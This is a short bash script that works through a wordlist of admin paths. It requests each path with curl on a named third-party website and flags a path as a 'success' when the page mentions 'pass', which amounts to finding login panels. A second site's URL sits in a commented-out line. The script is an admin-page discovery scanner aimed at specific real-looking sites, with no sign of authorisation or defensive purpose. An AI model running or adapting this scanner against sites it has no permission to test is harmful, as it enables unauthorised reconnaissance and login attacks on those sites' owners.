#!/bin/bash
#shopt -s nocasematch
#url="http://www.sbmsecurities.com"
#admin_list="admin_list1.txt"
for list in $(cat admin_list.txt); do
http_result=$(curl --silent http://www.exploreville.org.pk/"$list" | grep -oi "pass" | tr '[:upper:]' '[:lower:]' | uniq)
qwe=$(echo "$http_result" | tr '[:upper:]' '[:lower:]')
if [ "$qwe" != "pass" ]; then
echo "'$list': no success";
fi
if [ "$qwe" == "pass" ]; then
echo "'$list':-------------------------------------------------- success";
fi
done